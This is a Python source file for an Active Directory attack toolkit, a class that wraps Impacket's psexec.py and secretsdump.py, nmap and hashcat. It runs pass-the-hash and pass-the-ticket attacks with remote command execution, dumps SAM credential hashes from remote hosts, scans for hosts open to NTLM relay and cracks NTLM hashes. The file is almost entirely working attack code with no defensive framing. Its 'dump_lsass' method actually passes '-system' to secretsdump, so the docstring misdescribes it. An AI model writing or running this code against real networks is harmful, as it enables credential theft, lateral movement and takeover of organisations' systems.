"""NTLM-based attacks for Active Directory."""

import re
import os
import subprocess
from typing import List, Dict, Optional, Any
from pathlib import Path


class NTLMAttacker:
    """NTLM attack implementations."""

    def __init__(self):
        """Initialize NTLM attacker."""
        pass

    def _validate_ntlm_hash(self, ntlm_hash: str) -> bool:
        """Validate NTLM hash format.

        Args:
            ntlm_hash: Hash to validate (LM:NTLM or just NTLM)

        Returns:
            True if valid format
        """
        # Check for LM:NTLM format (32:32 hex chars)
        if ':' in ntlm_hash:
            parts = ntlm_hash.split(':')
            if len(parts) == 2:
                return (
                    len(parts[0]) == 32 and
                    len(parts[1]) == 32 and
                    all(c in '0123456789abcdefABCDEF' for c in parts[0]) and
                    all(c in '0123456789abcdefABCDEF' for c in parts[1])
                )

        # Check for just NTLM (32 hex chars)
        return (
            len(ntlm_hash) == 32 and
            all(c in '0123456789abcdefABCDEF' for c in ntlm_hash)
        )

    def pass_the_hash(
        self,
        username: str,
        ntlm_hash: str,
        target: str,
        command: Optional[str] = None,
        domain: Optional[str] = None
    ) -> Dict[str, Any]:
        """Execute Pass-the-Hash attack using psexec.

        Args:
            username: Username to authenticate as
            ntlm_hash: NTLM hash (LM:NTLM or just NTLM)
            target: Target IP or hostname
            command: Optional command to execute
            domain: Optional domain name

        Returns:
            Dictionary with success status and output
        """
        if not self._validate_ntlm_hash(ntlm_hash):
            return {"success": False, "error": "Invalid NTLM hash format"}

        try:
            # Ensure proper hash format (LM:NTLM)
            if ':' not in ntlm_hash:
                ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"

            # Build psexec command
            user_string = f"{domain}/{username}" if domain else username

            cmd = [
                "psexec.py",
                user_string + f"@{target}",
                "-hashes",
                ntlm_hash
            ]

            if command:
                cmd.append(command)

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else None
            }

        except FileNotFoundError:
            return {
                "success": False,
                "error": "psexec.py not found (install impacket)"
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command timed out"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def pass_the_ticket(
        self,
        ticket_path: str,
        target: str,
        command: Optional[str] = None
    ) -> Dict[str, Any]:
        """Execute Pass-the-Ticket attack.

        Args:
            ticket_path: Path to Kerberos ticket (.ccache or .kirbi)
            target: Target IP or hostname
            command: Optional command to execute

        Returns:
            Dictionary with success status
        """
        if not os.path.exists(ticket_path):
            return {
                "success": False,
                "error": "Ticket file not found"
            }

        try:
            # Set KRB5CCNAME environment variable
            env = os.environ.copy()
            env['KRB5CCNAME'] = ticket_path

            # Use psexec with Kerberos auth
            cmd = [
                "psexec.py",
                "-k",
                "-no-pass",
                target
            ]

            if command:
                cmd.append(command)

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                env=env
            )

            return {
                "success": result.returncode == 0,
                "ticket_loaded": True,
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else None
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    def dump_sam(
        self,
        target: str,
        username: str,
        password: Optional[str] = None,
        ntlm_hash: Optional[str] = None,
        domain: Optional[str] = None
    ) -> Optional[Dict[str, Any]]:
        """Dump SAM database from remote system.

        Args:
            target: Target IP or hostname
            username: Username for authentication
            password: User password (if not using hash)
            ntlm_hash: NTLM hash (if not using password)
            domain: Optional domain

        Returns:
            Dictionary with parsed hashes
        """
        try:
            # Build secretsdump command
            user_string = f"{domain}/{username}" if domain else username

            if password:
                cmd = [
                    "secretsdump.py",
                    f"{user_string}:{password}@{target}",
                    "-sam"
                ]
            elif ntlm_hash:
                if ':' not in ntlm_hash:
                    ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
                cmd = [
                    "secretsdump.py",
                    f"{user_string}@{target}",
                    "-hashes",
                    ntlm_hash,
                    "-sam"
                ]
            else:
                return {"error": "Must provide password or hash"}

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": result.stderr
                }

            # Parse SAM output
            hashes = self._parse_sam_output(result.stdout)

            return {
                "success": True,
                "hashes": hashes,
                "raw_output": result.stdout
            }

        except Exception as e:
            return {"error": str(e)}

    def _parse_sam_output(self, output: str) -> List[Dict[str, str]]:
        """Parse secretsdump SAM output.

        Args:
            output: Raw command output

        Returns:
            List of parsed user hashes
        """
        hashes = []

        for line in output.split('\n'):
            # Look for SAM hash lines (username:rid:lm:ntlm:::)
            if ':::' in line and not line.startswith('['):
                parts = line.split(':')
                if len(parts) >= 4:
                    hashes.append({
                        'username': parts[0].strip(),
                        'rid': parts[1],
                        'lm': parts[2],
                        'ntlm': parts[3]
                    })

        return hashes

    def dump_lsass(
        self,
        target: str,
        username: str,
        password: Optional[str] = None,
        ntlm_hash: Optional[str] = None,
        domain: Optional[str] = None
    ) -> Optional[Dict[str, Any]]:
        """Dump LSASS memory to extract credentials.

        Args:
            target: Target IP or hostname
            username: Username for authentication
            password: User password
            ntlm_hash: NTLM hash
            domain: Optional domain

        Returns:
            Dictionary with dump results
        """
        try:
            # Build secretsdump command
            user_string = f"{domain}/{username}" if domain else username

            if password:
                cmd = [
                    "secretsdump.py",
                    f"{user_string}:{password}@{target}",
                    "-system"
                ]
            elif ntlm_hash:
                if ':' not in ntlm_hash:
                    ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
                cmd = [
                    "secretsdump.py",
                    f"{user_string}@{target}",
                    "-hashes",
                    ntlm_hash,
                    "-system"
                ]
            else:
                return {"error": "Must provide password or hash"}

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else None
            }

        except Exception as e:
            return {"error": str(e)}

    def detect_relay_vulnerable(
        self,
        targets: List[str],
        threads: int = 10
    ) -> List[Dict[str, Any]]:
        """Detect hosts vulnerable to NTLM relay (SMB signing disabled).

        Args:
            targets: List of target IPs/hostnames
            threads: Number of concurrent threads

        Returns:
            List of vulnerable hosts
        """
        vulnerable = []

        try:
            for target in targets:
                # Use nmap to check SMB signing
                cmd = [
                    "nmap",
                    "-p", "445",
                    "--script", "smb-security-mode",
                    target
                ]

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )

                # Parse output for signing requirement
                if "message_signing: disabled" in result.stdout.lower():
                    vulnerable.append({
                        "target": target,
                        "smb_signing": False,
                        "vulnerable": True
                    })

        except Exception as e:
            print(f"❌ NTLM relay detection error: {e}")

        return vulnerable

    def crack_hash(
        self,
        ntlm_hash: str,
        wordlist: str
    ) -> Optional[str]:
        """Crack NTLM hash using hashcat.

        Args:
            ntlm_hash: NTLM hash to crack
            wordlist: Path to wordlist

        Returns:
            Cracked password or None
        """
        try:
            # Save hash to temp file
            hash_file = "/tmp/ntlm_hash.txt"
            with open(hash_file, 'w') as f:
                f.write(ntlm_hash)

            # Run hashcat (mode 1000 for NTLM)
            cmd = [
                "hashcat",
                "-m", "1000",
                "-a", "0",
                hash_file,
                wordlist,
                "--quiet"
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            # Parse cracked password
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ':' in line:
                        return line.split(':')[-1].strip()

            return None

        except FileNotFoundError:
            print("❌ hashcat not found")
            return None
        except Exception as e:
            print(f"❌ Hash cracking error: {e}")
            return None
